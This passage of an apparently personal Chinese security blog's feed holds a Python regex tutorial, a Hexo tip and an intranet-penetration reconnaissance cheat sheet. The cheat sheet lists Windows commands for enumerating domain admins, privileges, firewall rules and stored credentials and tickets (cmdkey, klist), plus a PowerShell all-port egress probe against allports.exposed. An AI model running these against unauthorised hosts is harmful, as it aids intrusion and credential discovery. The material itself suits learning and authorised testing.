    <content type="html"><![CDATA[<h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>为什么要学re库呢？这里主要学他的正则表达，在编写安全脚本的时候肯定要遇到一些不规则的匹配规则，当然编写爬虫也少不了正则匹配去找到一些具有特殊特征的字符串。因此这是十分必要的，然而。re库使 Python 语言拥有全部的正则表达式功能。我会先介绍一些常见的函数的功能并且举例。后再举例说明。一些常见的情况。当然除了掌握函数的功能，这只是基础，重点是自己会构造pattern。</p><p>这里介绍的匹配通俗来讲就是在一段字符串里面找某段字符串（pattern），在re库里面就有re.match()和re.search()等一些函数来找。</p><p>一定要会使用编译函数comlie(),find_all(),还有会正则表达格式。</p><h1 id="二、re-match"><a href="#二、re-match" class="headerlink" title="二、re.match()"></a>二、re.match()</h1><p>re.match 尝试从字符串的起始位置匹配一个模式，如果不是起始位置匹配成功的话，match() 就返回 none。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">规则是</span><br><span class="line">re.match(pattern,string,flag)</span><br></pre></td></tr></table></figure><p>举例说明：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line">print(re.match(&#x27;www&#x27;,&#x27;www.baidu.com&#x27;))</span><br><span class="line">print(re.match(&#x27;www&#x27;,&#x27;www.baidu.com&#x27;).span())</span><br><span class="line">print(re.match(&#x27;www&#x27;,&#x27;ewwww&#x27;))</span><br><span class="line"></span><br><span class="line">#输出</span><br><span class="line">&lt;re.Match object; span=(0, 3), match=&#x27;www&#x27;&gt; #匹配成功返回一个对象</span><br><span class="line">（0,3）#只要起始位置到结束</span><br><span class="line">None#起始位置不匹配。返回空</span><br></pre></td></tr></table></figure><p>这里就要提到另外一个知识点，我们知道，re.match返回的是一个obj，其中里面包含了span也就是位置，那我要返回匹配到的字符呢？为什么要返回匹配到的字符呢？因为这里的pattern到后面我们是自己设置的一些模式化的字符，比如我们要在一个js文件里面找出url，那么我们就要编写pattern模式，然后返回这个匹配到的模式字符。</p><p>所有这里引出来group()</p><p><strong>group()</strong></p><p>当使用正则表达式匹配时，通常会定义一个模式，该模式中包含一个或多个用括号括起来的子表达式，这些子表达式被称为”捕获组”。这些捕获组用于从匹配的文本中提取特定部分。例如，考虑以下示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line">text = &quot;My phone number is 123-456-7890.&quot;</span><br><span class="line"></span><br><span class="line"># 匹配电话号码的模式，使用捕获组提取区号、中间号和最后四位数字</span><br><span class="line">pattern = r&#x27;(\d&#123;3&#125;)-(\d&#123;3&#125;)-(\d&#123;4&#125;)&#x27;</span><br><span class="line"></span><br><span class="line">match = re.search(pattern, text)</span><br><span class="line"></span><br><span class="line">if match:</span><br><span class="line">    full_match = match.group(0)  # 整个匹配</span><br><span class="line">    area_code = match.group(1)  # 第一个捕获组</span><br><span class="line">    middle_digits = match.group(2)  # 第二个捕获组</span><br><span class="line">    last_digits = match.group(3)  # 第三个捕获组</span><br><span class="line"></span><br><span class="line">    print(&quot;Full Match: &quot;, full_match)</span><br><span class="line">    print(&quot;Area Code: &quot;, area_code)</span><br><span class="line">    print(&quot;Middle Digits: &quot;, middle_digits)</span><br><span class="line">    print(&quot;Last Digits: &quot;, last_digits)</span><br><span class="line">else:</span><br><span class="line">    print(&quot;No match.&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#结果</span><br><span class="line">Full Match:  123-456-7890</span><br><span class="line">Area Code:  123</span><br><span class="line">Middle Digits:  456</span><br><span class="line">Last Digits:  7890</span><br></pre></td></tr></table></figure><p>通俗解释就是：在<code>pattern = r&#39;(\d&#123;3&#125;)-(\d&#123;3&#125;)-(\d&#123;4&#125;)&#39;</code>模式中，有三个捕获组，当匹配到的时候就可以使用group（）返回整个匹配到的内容。使用group（1）就可以返回第一个捕获组。</p><p>如果要不区分大小写，就把flag设置为 re.M|re.I</p><p>例如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">re.search(pattern, text，re.M|re.I)</span><br></pre></td></tr></table></figure><h1 id="三、re-search"><a href="#三、re-search" class="headerlink" title="三、re.search()"></a>三、re.search()</h1><p>OK！到这里基本上已经了解到什么是匹配什么是模式，怎么返回匹配到的内容或者位置。现在引入另外一个常见的就是search</p><p>通常我们使用的都是这个去匹配而不是使用match；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">使用规则</span><br><span class="line">re.search(pattern,string,flag)</span><br><span class="line">与match的区别在于，search是从整个string中查找到pattern，然后返回obj,否则返回none。而match是只从开始找，如果一开始就不匹配那就返回none</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">pattern = &#x27;ww&#x27;</span><br><span class="line">string = &#x27;aww&#x27;</span><br><span class="line">string2 = &#x27;wwsdgsdww&#x27;</span><br><span class="line">match = re.search(pattern,string)</span><br><span class="line">match2 = re.search(pattern,string2)</span><br><span class="line">print(match)</span><br><span class="line">print(match2)</span><br><span class="line">print(match.group())</span><br><span class="line"></span><br><span class="line">#输出</span><br><span class="line"></span><br><span class="line">&lt;re.Match object; span=(1, 3), match=&#x27;ww&#x27;&gt;</span><br><span class="line">&lt;re.Match object; span=(0, 2), match=&#x27;ww&#x27;&gt;</span><br><span class="line">ww</span><br></pre></td></tr></table></figure><h1 id="四、替换函数re-sub（）"><a href="#四、替换函数re-sub（）" class="headerlink" title="四、替换函数re.sub（）"></a>四、替换函数re.sub（）</h1> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">re.sub(pattern, repl, string, count=0, flags=0)</span><br><span class="line"></span><br><span class="line">参数：</span><br><span class="line"></span><br><span class="line">- pattern : 正则中的模式字符串。</span><br><span class="line">- repl : 替换的字符串，也可为一个函数。</span><br><span class="line">- string : 要被查找替换的原始字符串。</span><br><span class="line">- count : 模式匹配后替换的最大次数，默认 0 表示替换所有的匹配。</span><br></pre></td></tr></table></figure><p>  举例：</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line">pattern = &#x27;ww&#x27;</span><br><span class="line">string2 = &#x27;wwsdgsdww&#x27;</span><br><span class="line">replace = re.sub(pattern,&quot;okok&quot;,string2)</span><br><span class="line">print(replace)</span><br><span class="line"></span><br><span class="line">#结果</span><br><span class="line">okoksdgsdokok</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="五、编译函数compile"><a href="#五、编译函数compile" class="headerlink" title="五、编译函数compile()"></a>五、编译函数compile()</h1><p>主要作用就是编译，什么意思？就是将pattern进行编译，在不编译pattern之前，我们是直接把pattern放进函数里面的，那样他会自己编译，但是当我们编译了之后就不用直接调用了。</p><p>  举例：</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">  import re</span><br><span class="line">  </span><br><span class="line">  pattern = &#x27;ww&#x27;</span><br><span class="line">  string2 = &#x27;wwsdgsdww&#x27;</span><br><span class="line">  replace = re.search(pattern,string2)</span><br><span class="line">  print(replace)</span><br><span class="line">  #使用编译</span><br><span class="line">  pattern = re.compile(pattern)</span><br><span class="line">  replace = pattern.search(string2)</span><br><span class="line">  print(replace)</span><br><span class="line">  </span><br><span class="line">  #输出</span><br><span class="line">  </span><br><span class="line">  &lt;re.Match object; span=(0, 2), match=&#x27;ww&#x27;&gt;</span><br><span class="line">&lt;re.Match object; span=(0, 2), match=&#x27;ww&#x27;&gt;</span><br><span class="line">  </span><br></pre></td></tr></table></figure><h1 id="六、查找函数find-all-，finditer"><a href="#六、查找函数find-all-，finditer" class="headerlink" title="六、查找函数find_all()，finditer()"></a>六、查找函数find_all()，finditer()</h1><p>与search的区别在于它找到的是多个，返回的是一个列表。</p><p>规则：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">findall(string[, pos[, endpos]])</span><br><span class="line">比如：</span><br><span class="line">findall(string,0,10)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>举例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line">pattern = &#x27;ww&#x27;</span><br><span class="line">string2 = &#x27;wwsdgsdww&#x27;</span><br><span class="line">pattern = re.compile(pattern)</span><br><span class="line">result = pattern.findall(string2)</span><br><span class="line">print(result)</span><br><span class="line"></span><br><span class="line">#输出</span><br><span class="line">[&#x27;ww&#x27;, &#x27;ww&#x27;]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>finditer和find_all一样。只不过finditer返回的是迭代，而不是列表。需要使用for循环print出来。</p><h1 id="七、正则表达式"><a href="#七、正则表达式" class="headerlink" title="七、正则表达式"></a>七、正则表达式</h1><p>这里很重要，但是知识点又很多，所以看懂就行，建议当要设置匹配某个字符的特征表达式的时候，集合chatgpt来写。</p><table><thead><tr><th align="left">模式</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">^</td><td align="left">匹配字符串的开头</td></tr><tr><td align="left">$</td><td align="left">匹配字符串的末尾。</td></tr><tr><td align="left">.</td><td align="left">匹配任意字符，除了换行符，当re.DOTALL标记被指定时，则可以匹配包括换行符的任意字符。</td></tr><tr><td align="left">[…]</td><td align="left">用来表示一组字符,单独列出：[amk] 匹配 ‘a’，’m’或’k’</td></tr><tr><td align="left">[^…]</td><td align="left">不在[]中的字符：[^abc] 匹配除了a,b,c之外的字符。</td></tr><tr><td align="left">re*</td><td align="left">匹配0个或多个的表达式。</td></tr><tr><td align="left">re+</td><td align="left">匹配1个或多个的表达式。</td></tr><tr><td align="left">re?</td><td align="left">匹配0个或1个由前面的正则表达式定义的片段，非贪婪方式</td></tr><tr><td align="left">re{ n}</td><td align="left">精确匹配 n 个前面表达式。例如， <strong>o{2}</strong> 不能匹配 “Bob” 中的 “o”，但是能匹配 “food” 中的两个 o。</td></tr><tr><td align="left">re{ n,}</td><td align="left">匹配 n 个前面表达式。例如， o{2,} 不能匹配”Bob”中的”o”，但能匹配 “foooood”中的所有 o。”o{1,}” 等价于 “o+”。”o{0,}” 则等价于 “o*”。</td></tr><tr><td align="left">re{ n, m}</td><td align="left">匹配 n 到 m 次由前面的正则表达式定义的片段，贪婪方式</td></tr><tr><td align="left">a| b</td><td align="left">匹配a或b</td></tr><tr><td align="left">(re)</td><td align="left">对正则表达式分组并记住匹配的文本</td></tr><tr><td align="left">(?imx)</td><td align="left">正则表达式包含三种可选标志：i, m, 或 x 。只影响括号中的区域。</td></tr><tr><td align="left">(?-imx)</td><td align="left">正则表达式关闭 i, m, 或 x 可选标志。只影响括号中的区域。</td></tr><tr><td align="left">(?: re)</td><td align="left">类似 (…), 但是不表示一个组</td></tr><tr><td align="left">(?imx: re)</td><td align="left">在括号中使用i, m, 或 x 可选标志</td></tr><tr><td align="left">(?-imx: re)</td><td align="left">在括号中不使用i, m, 或 x 可选标志</td></tr><tr><td align="left">(?#…)</td><td align="left">注释.</td></tr><tr><td align="left">(?&#x3D; re)</td><td align="left">前向肯定界定符。如果所含正则表达式，以 … 表示，在当前位置成功匹配时成功，否则失败。但一旦所含表达式已经尝试，匹配引擎根本没有提高；模式的剩余部分还要尝试界定符的右边。</td></tr><tr><td align="left">(?! re)</td><td align="left">前向否定界定符。与肯定界定符相反；当所含表达式不能在字符串当前位置匹配时成功</td></tr><tr><td align="left">(?&gt; re)</td><td align="left">匹配的独立模式，省去回溯。</td></tr><tr><td align="left">\w</td><td align="left">匹配字母数字及下划线</td></tr><tr><td align="left">\W</td><td align="left">匹配非字母数字及下划线</td></tr><tr><td align="left">\s</td><td align="left">匹配任意空白字符，等价于 **[ \t\n\r\f]**。</td></tr><tr><td align="left">\S</td><td align="left">匹配任意非空字符</td></tr><tr><td align="left">\d</td><td align="left">匹配任意数字，等价于 [0-9].</td></tr><tr><td align="left">\D</td><td align="left">匹配任意非数字</td></tr><tr><td align="left">\A</td><td align="left">匹配字符串开始</td></tr><tr><td align="left">\Z</td><td align="left">匹配字符串结束，如果是存在换行，只匹配到换行前的结束字符串。</td></tr><tr><td align="left">\z</td><td align="left">匹配字符串结束</td></tr><tr><td align="left">\G</td><td align="left">匹配最后匹配完成的位置。</td></tr><tr><td align="left">\b</td><td align="left">匹配一个单词边界，也就是指单词和空格间的位置。例如， ‘er\b’ 可以匹配”never” 中的 ‘er’，但不能匹配 “verb” 中的 ‘er’。</td></tr><tr><td align="left">\B</td><td align="left">匹配非单词边界。’er\B’ 能匹配 “verb” 中的 ‘er’，但不能匹配 “never” 中的 ‘er’。</td></tr><tr><td align="left">\n, \t, 等.</td><td align="left">匹配一个换行符。匹配一个制表符。等</td></tr><tr><td align="left">\1…\9</td><td align="left">匹配第n个分组的内容。</td></tr><tr><td align="left">\10</td><td align="left">匹配第n个分组的内容，如果它经匹配。否则指的是八进制字符码的表达式。</td></tr></tbody></table><p>举例：</p><p>在前端的代码中找出url：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">import requests,re</span><br><span class="line"></span><br><span class="line"># url = &quot;https://ruan0423.github.io/&quot;</span><br><span class="line">url = &#x27;https://www.baidu.com&#x27;</span><br><span class="line"></span><br><span class="line">js_tewxt = requests.get(url).text</span><br><span class="line"># print(js_tewxt)</span><br><span class="line">pattern_raw = r&quot;&quot;&quot;</span><br><span class="line">  (?:&quot;|&#x27;)                               # Start newline delimiter</span><br><span class="line">  (</span><br><span class="line">    ((?:[a-zA-Z]&#123;1,10&#125;://|//)           # Match a scheme [a-Z]*1-10 or //</span><br><span class="line">    [^&quot;&#x27;/]&#123;1,&#125;\.                        # Match a domainname (any character + dot)</span><br><span class="line">    [a-zA-Z]&#123;2,&#125;[^&quot;&#x27;]&#123;0,&#125;)              # The domainextension and/or path</span><br><span class="line">    |</span><br><span class="line">    ((?:/|\.\./|\./)                    # Start with /,../,./</span><br><span class="line">    [^&quot;&#x27;&gt;&lt;,;| *()(%%$^/\\\[\]]          # Next character can&#x27;t be...</span><br><span class="line">    [^&quot;&#x27;&gt;&lt;,;|()]&#123;1,&#125;)                   # Rest of the characters can&#x27;t be</span><br><span class="line">    |</span><br><span class="line">    ([a-zA-Z0-9_\-/]&#123;1,&#125;/               # Relative endpoint with /</span><br><span class="line">    [a-zA-Z0-9_\-/]&#123;1,&#125;                 # Resource name</span><br><span class="line">    \.(?:[a-zA-Z]&#123;1,4&#125;|action)          # Rest + extension (length 1-4 or action)</span><br><span class="line">    (?:[\?|/][^&quot;|&#x27;]&#123;0,&#125;|))              # ? mark with parameters</span><br><span class="line">    |</span><br><span class="line">    ([a-zA-Z0-9_\-]&#123;1,&#125;                 # filename</span><br><span class="line">    \.(?:php|asp|aspx|jsp|json|</span><br><span class="line">         action|html|js|txt|xml)             # . + extension</span><br><span class="line">    (?:\?[^&quot;|&#x27;]&#123;0,&#125;|))                  # ? mark with parameters</span><br><span class="line">  )</span><br><span class="line">  (?:&quot;|&#x27;)                               # End newline delimiter</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">pattern_raw = re.compile(pattern_raw,re.VERBOSE)</span><br><span class="line"></span><br><span class="line">result = pattern_raw.finditer(str(js_tewxt))</span><br><span class="line"># print(result)</span><br><span class="line"></span><br><span class="line">for i in result:</span><br><span class="line">    print(i.group())</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>#结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;http://www.baidu.com/bdorz/login.gif?login&amp;tpl=mn&amp;u=&#x27;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一、前言&quot;&gt;&lt;a href=&quot;#一、前言&quot; class=&quot;headerlink&quot; title=&quot;一、前言&quot;&gt;&lt;/a&gt;一、前言&lt;/h1&gt;&lt;p&gt;为什么要学re库呢？这里主要学他的正则表达，在编写安全脚本的时候肯定要遇到一些不规则的匹配规则，当然编写爬虫也少不了正则匹配</summary>
      
    
    
    
    <category term="python" scheme="https://ruan0423.github.io/categories/python/"/>
    
    
    <category term="代码 python 开发 脚本" scheme="https://ruan0423.github.io/tags/%E4%BB%A3%E7%A0%81-python-%E5%BC%80%E5%8F%91-%E8%84%9A%E6%9C%AC/"/>
    
  </entry>
  
  <entry>
    <title>hexo使用小技巧2</title>
    <link href="https://ruan0423.github.io/2023/10/28/hexo%E4%BD%BF%E7%94%A8%E5%B0%8F%E6%8A%80%E5%B7%A7/"/>
    <id>https://ruan0423.github.io/2023/10/28/hexo%E4%BD%BF%E7%94%A8%E5%B0%8F%E6%8A%80%E5%B7%A7/</id>
    <published>2023-10-28T11:40:23.000Z</published>
    <updated>2023-10-28T12:08:57.825Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-在博客中加入图片"><a href="#1-在博客中加入图片" class="headerlink" title="1.在博客中加入图片"></a>1.在博客中加入图片</h2><p>使用语法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% asset_img 1.jpg %&#125;</span><br></pre></td></tr></table></figure><p>这样hexo会自动渲染1.jpg.，然后1.jpg的位置需要放在同文件名的文件夹中，比如这篇博客叫hexo使用小技巧，那么这张图片就要在这个目录中，如下图所示：</p><img src="/2023/10/28/hexo%E4%BD%BF%E7%94%A8%E5%B0%8F%E6%8A%80%E5%B7%A7/1.png" class=""><h2 id="2-对博客进行贴标签分类，在文件中使用"><a href="#2-对博客进行贴标签分类，在文件中使用" class="headerlink" title="2.对博客进行贴标签分类，在文件中使用"></a>2.对博客进行贴标签分类，在文件中使用</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">tile: 文章主题</span><br><span class="line">date: 文章日期</span><br><span class="line">categories: 文章分类</span><br><span class="line">tags: 标签</span><br><span class="line">---</span><br></pre></td></tr></table></figure><p>注意：后还要有空格，不然会编译报错。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-在博客中加入图片&quot;&gt;&lt;a href=&quot;#1-在博客中加入图片&quot; class=&quot;headerlink&quot; title=&quot;1.在博客中加入图片&quot;&gt;&lt;/a&gt;1.在博客中加入图片&lt;/h2&gt;&lt;p&gt;使用语法&lt;/p&gt;
&lt;figure class=&quot;highlight plai</summary>
      
    
    
    
    <category term="说明" scheme="https://ruan0423.github.io/categories/%E8%AF%B4%E6%98%8E/"/>
    
    
    <category term="说明" scheme="https://ruan0423.github.io/tags/%E8%AF%B4%E6%98%8E/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透-信息收集（常见命令篇）</title>
    <link href="https://ruan0423.github.io/2023/10/28/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <id>https://ruan0423.github.io/2023/10/28/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</id>
    <published>2023-10-28T05:03:27.000Z</published>
    <updated>2023-10-30T04:56:01.463Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>对于所有的渗透而言，信息收集是最重要的一步，关系着后续的所有进程。对于内网渗透来说，信息收集主要就是对所拿下的一台主机进行信息探索。这里主要介绍一些常用的命令。</p><h1 id="二、获得主机的基本信息"><a href="#二、获得主机的基本信息" class="headerlink" title="二、获得主机的基本信息"></a>二、获得主机的基本信息</h1><p><strong>1.获取主机名hostname</strong></p><img src="/2023/10/28/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/1.png" class=""><p><strong>2.获取系统信息systeminfo</strong></p><p>**3.查看进程信息tasklist ;**这个命令可以查看当前主机运行了哪些进程。</p><h1 id="三、域信息"><a href="#三、域信息" class="headerlink" title="三、域信息"></a>三、域信息</h1><p>收集域信息是必须的，首先判断一台主机是否存在域；基本上net 命令后面执行&#x2F;domain 有域就可以执行成功；比如net time &#x2F;domain.执行成功之后就会看到主域的时间和主域的信息和主机名。</p><p>查看域控： net group  “domain controllers”</p><p><strong>1.ipconfig &#x2F;all</strong></p><p>可以看到主机的域信息和ip信息。</p><p><strong>2.net group &#x2F;domain</strong></p><p>查看域内的组信息。</p><p><strong>3.net user  &#x2F;domain</strong></p><p>查看域用户</p><p><strong>4.net group “domain admins” &#x2F;domain</strong></p><p>查看域内的管理员。</p><p>这里基本上都是使用到net  那就介绍一下net的语法吧</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">net user: 用于管理本地计算机上的用户帐户。您可以使用它来创建、修改、删除用户帐户，以及更改用户密码。</span><br><span class="line"></span><br><span class="line">net group: 用于管理本地计算机上的用户组。它允许您创建、修改和删除用户组，以及管理组成员。</span><br><span class="line"></span><br><span class="line">net share: 用于管理共享文件夹和打印机。您可以使用它来创建、修改和删除共享，以及查看共享的状态。</span><br><span class="line"></span><br><span class="line">net view: 用于查看网络上可用的计算机和共享资源列表。它可以帮助您查看网络中的其他计算机。</span><br><span class="line"></span><br><span class="line">net use: 用于连接到或断开网络共享资源，如文件夹或打印机。您可以使用它来映射网络驱动器，使共享资源在本地计算机上可用。</span><br><span class="line"></span><br><span class="line">net time: 用于同步计算机的时间与网络时间服务器，以确保计算机的时钟准确。</span><br><span class="line"></span><br><span class="line">net start 和 net stop: 用于启动或停止 Windows 服务。您可以使用这些命令来管理系统中正在运行的服务。</span><br><span class="line"></span><br><span class="line">netstat: 用于查看网络连接和统计信息，包括本地和远程计算机之间的网络连接。</span><br></pre></td></tr></table></figure><h1 id="四、用户信息"><a href="#四、用户信息" class="headerlink" title="四、用户信息"></a>四、用户信息</h1><p>域信息收集之后再查看一下当前主机的信息。通常查看当前主机有些什么特权</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.whoami /all</span><br><span class="line">可以一键查看当前用户的信息和特权</span><br><span class="line"></span><br><span class="line">2.whoami /priv 只查看特权</span><br><span class="line"></span><br><span class="line">3.quser 查看在线的用户</span><br></pre></td></tr></table></figure><h1 id="五、网络信息"><a href="#五、网络信息" class="headerlink" title="五、网络信息"></a>五、网络信息</h1><p><strong>1.arp -a</strong></p><p>可查看网卡信息</p><p><strong>2.netstat -a</strong></p><p>监听的端口</p><p>3.探测出网情况</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -c &quot;1..65535 | % &#123;echo ((new-object Net.Sockets.TcpClient).Connect(&#x27;allports.exposed&#x27;,$_)) $_ &#125; 2&gt;$null&quot;</span><br></pre></td></tr></table></figure><h1 id="六、防火墙"><a href="#六、防火墙" class="headerlink" title="六、防火墙"></a>六、防火墙</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">查看防火墙状态 netsh advfirewall show allprofiles</span><br><span class="line">防火墙日志目录 netsh firewall show logging</span><br><span class="line">防火墙规则 netsh advfirewall firewall show rule name=all</span><br><span class="line">netsh firewall show config</span><br><span class="line">netsh firewall show state</span><br></pre></td></tr></table></figure><h1 id="七、密码信息，票据信息"><a href="#七、密码信息，票据信息" class="headerlink" title="七、密码信息，票据信息"></a>七、密码信息，票据信息</h1><p>密码信息，有的密码是保存在浏览器的填充中。</p><p>票据信息可以使用cmdkey &#x2F;l</p><p>klist</p><p>文章主要参考：<a href="https://websec.readthedocs.io/zh/latest/intranet/windows/info.html#section-5">https://websec.readthedocs.io/zh/latest/intranet/windows/info.html#section-5</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一、前言&quot;&gt;&lt;a href=&quot;#一、前言&quot; class=&quot;headerlink&quot; title=&quot;一、前言&quot;&gt;&lt;/a&gt;一、前言&lt;/h1&gt;&lt;p&gt;对于所有的渗透而言，信息收集是最重要的一步，关系着后续的所有进程。对于内网渗透来说，信息收集主要就是对所拿下的一台主机进行信</summary>
      
    
    
    
    <category term="内网渗透" scheme="https://ruan0423.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="内网渗透" scheme="https://ruan0423.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
</feed>
